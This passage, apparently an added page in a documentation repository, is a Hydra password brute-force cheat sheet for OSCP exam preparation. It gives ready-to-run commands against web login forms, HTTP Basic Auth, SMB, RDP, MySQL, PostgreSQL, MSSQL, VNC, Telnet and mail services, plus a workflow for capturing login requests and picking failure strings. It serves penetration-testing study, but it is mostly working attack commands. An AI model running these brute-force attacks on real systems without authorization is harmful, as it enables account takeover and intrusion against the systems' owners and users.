+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/auth/login:username=^USER^&amp;password=^PASS^&amp;redirect=/dashboard&amp;submit=Login:F=Invalid&quot;</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="c1"># JSON-like parameters (URL encoded)</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/api/auth:username=^USER^&amp;password=^PASS^:F=\&quot;error\&quot;&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="http-get-form-attacks">HTTP GET Form Attacks</h2>
+<h3 id="basic-get-form">Basic GET Form</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Basic GET authentication</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-get-form<span class="w"> </span><span class="s2">&quot;/login.php?username=^USER^&amp;password=^PASS^:F=incorrect&quot;</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># With query parameters</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-get-form<span class="w"> </span><span class="s2">&quot;/auth?user=^USER^&amp;pass=^PASS^&amp;submit=Login:F=failed&quot;</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c1"># Multiple failure indicators</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-get-form<span class="w"> </span><span class="s2">&quot;/login?username=^USER^&amp;password=^PASS^:F=Invalid login&quot;</span>
+</span></code></pre></div>
+<h3 id="get-with-custom-headers">GET with Custom Headers</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># With User-Agent</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-get-form<span class="w"> </span><span class="s2">&quot;/login?user=^USER^&amp;pass=^PASS^:F=error:H=User-Agent: Mozilla/5.0&quot;</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="c1"># With Referer</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-get-form<span class="w"> </span><span class="s2">&quot;/admin?username=^USER^&amp;password=^PASS^:F=denied:H=Referer: http://192.168.1.100/&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="http-basic-auth">HTTP Basic Auth</h2>
+<h3 id="basic-authentication">Basic Authentication</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># HTTP Basic Auth</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-get<span class="w"> </span>/admin/
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># HTTPS Basic Auth</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>https-get<span class="w"> </span>/admin/
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="c1"># Custom port</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-s<span class="w"> </span><span class="m">8080</span><span class="w"> </span>http-get<span class="w"> </span>/protected/
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="c1"># With path</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-head<span class="w"> </span>/restricted/index.php
+</span></code></pre></div>
+<hr />
+<h2 id="https-attacks">HTTPS Attacks</h2>
+<h3 id="https-post-form">HTTPS POST Form</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># HTTPS POST</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>https-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:F=incorrect&quot;</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># HTTPS GET</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>https-get-form<span class="w"> </span><span class="s2">&quot;/login?user=^USER^&amp;pass=^PASS^:F=failed&quot;</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="c1"># HTTPS Basic Auth</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>https-get<span class="w"> </span>/admin/
+</span></code></pre></div>
+<hr />
+<h2 id="smb-brute-force">SMB Brute Force</h2>
+<h3 id="basic-smb-attack">Basic SMB Attack</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Single user</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>smb://192.168.1.100
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c1"># Multiple users</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>smb://192.168.1.100
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="c1"># Default credentials</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>hydra<span class="w"> </span>-C<span class="w"> </span>default_credentials.txt<span class="w"> </span>smb://192.168.1.100
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="c1"># With domain</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>DOMAIN<span class="se">\\</span>administrator<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>smb://192.168.1.100
+</span></code></pre></div>
+<hr />
+<h2 id="rdp-brute-force">RDP Brute Force</h2>
+<h3 id="basic-rdp-attack">Basic RDP Attack</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Single user</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>rdp://192.168.1.100
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Multiple users</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>rdp://192.168.1.100
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c1"># Custom port</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>rdp://192.168.1.100:3389
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="c1"># Verbose with slower timing</span>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-V<span class="w"> </span>rdp://192.168.1.100
+</span></code></pre></div>
+<hr />
+<h2 id="mysqlpostgresqlmssql">MySQL/PostgreSQL/MSSQL</h2>
+<h3 id="mysql">MySQL</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Basic MySQL attack</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>mysql://192.168.1.100
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># Custom port</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>mysql://192.168.1.100:3306
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c1"># Multiple users</span>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>mysql://192.168.1.100
+</span></code></pre></div>
+<h3 id="postgresql">PostgreSQL</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># PostgreSQL attack</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>postgres<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>postgres://192.168.1.100
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># With database name</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>postgres<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>postgres://192.168.1.100/template1
+</span></code></pre></div>
+<h3 id="mssql">MSSQL</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># MSSQL attack</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>sa<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>mssql://192.168.1.100
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1"># Custom port</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>sa<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>mssql://192.168.1.100:1433
+</span></code></pre></div>
+<hr />
+<h2 id="vnc-brute-force">VNC Brute Force</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># VNC password only (no username)</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>hydra<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>vnc://192.168.1.100
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="c1"># Custom port</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>hydra<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>vnc://192.168.1.100:5900
+</span></code></pre></div>
+<hr />
+<h2 id="telnet-brute-force">Telnet Brute Force</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># Basic telnet</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>telnet://192.168.1.100
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c1"># Multiple users</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>telnet://192.168.1.100
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="c1"># Custom port</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>telnet://192.168.1.100:23
+</span></code></pre></div>
+<hr />
+<h2 id="pop3imapsmtp">POP3/IMAP/SMTP</h2>
+<h3 id="pop3">POP3</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># POP3 attack</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user@domain.com<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>pop3://192.168.1.100
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="c1"># POP3S (SSL)</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user@domain.com<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>pop3s://192.168.1.100:995
+</span></code></pre></div>
+<h3 id="imap">IMAP</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># IMAP attack</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user@domain.com<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>imap://192.168.1.100
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="c1"># IMAPS (SSL)</span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user@domain.com<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>imaps://192.168.1.100:993
+</span></code></pre></div>
+<h3 id="smtp">SMTP</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># SMTP attack</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user@domain.com<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>smtp://192.168.1.100
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="c1"># SMTP AUTH</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user@domain.com<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>smtp://192.168.1.100:587
+</span></code></pre></div>
+<hr />
+<h2 id="oscp-exam-workflow">OSCP Exam Workflow</h2>
+<h3 id="phase-1-reconnaissance-2-5-min">Phase 1: Reconnaissance (2-5 min)</h3>
+<ul>
+<li>[ ] Identify login page/service</li>
+<li>[ ] Note parameter names (username, password, etc.)</li>
+<li>[ ] Check for error messages</li>
+<li>[ ] Identify success/failure indicators</li>
+<li>[ ] Check if CSRF tokens are required</li>
+<li>[ ] Note any cookies needed</li>
+</ul>
+<h3 id="phase-2-capture-request-5-10-min">Phase 2: Capture Request (5-10 min)</h3>
+<p><strong>Using Burp Suite:</strong>
+1. Intercept login request
+2. Note all parameters
+3. Note headers and cookies
+4. Identify POST data format
+5. Check for hidden fields</p>
+<p><strong>Using Browser DevTools:</strong>
+1. Open Network tab
+2. Submit login attempt
+3. View request details
+4. Copy POST data format</p>
+<h3 id="phase-3-build-hydra-command-5-min">Phase 3: Build Hydra Command (5 min)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Template for web POST form</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>USERNAME<span class="w"> </span>-P<span class="w"> </span>PASSWORDS<span class="w"> </span>IP<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/PATH:PARAMS:F=FAIL_STRING&quot;</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="c1"># Add headers if needed</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>USERNAME<span class="w"> </span>-P<span class="w"> </span>PASSWORDS<span class="w"> </span>IP<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/PATH:PARAMS:F=FAIL_STRING:H=HEADERS&quot;</span>
+</span></code></pre></div>
+<h3 id="phase-4-execute-attack-variable">Phase 4: Execute Attack (Variable)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># Start with small wordlist</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt<span class="w"> </span>-V<span class="w"> </span>-f<span class="w"> </span>target<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;...&quot;</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="c1"># If no results, try larger list</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt<span class="w"> </span>-V<span class="w"> </span>-f<span class="w"> </span>target<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;...&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="web-attack-techniques">Web Attack Techniques</h2>
+<h3 id="finding-the-correct-failure-string">Finding the Correct Failure String</h3>
+<p><strong>Method 1: Inspect Failed Login</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># Try manual login with wrong credentials</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="c1"># Look for unique text like:</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>-<span class="w"> </span><span class="s2">&quot;Invalid username or password&quot;</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>-<span class="w"> </span><span class="s2">&quot;Login failed&quot;</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>-<span class="w"> </span><span class="s2">&quot;Incorrect credentials&quot;</span>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>-<span class="w"> </span><span class="s2">&quot;Access denied&quot;</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>-<span class="w"> </span><span class="s2">&quot;Error&quot;</span>
+</span></code></pre></div></p>
+<p><strong>Method 2: Test with cURL</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="s2">&quot;http://192.168.1.100/login.php&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=admin&amp;password=wrongpass&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;error\|invalid\|failed&quot;</span>
+</span></code></pre></div></p>
+<h3 id="dealing-with-dynamic-content">Dealing with Dynamic Content</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1"># Use specific failure text that appears only on failed login</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="c1"># Avoid generic text like &quot;Login&quot; or &quot;Welcome&quot; that might appear elsewhere</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="c1"># Good failure strings:</span>
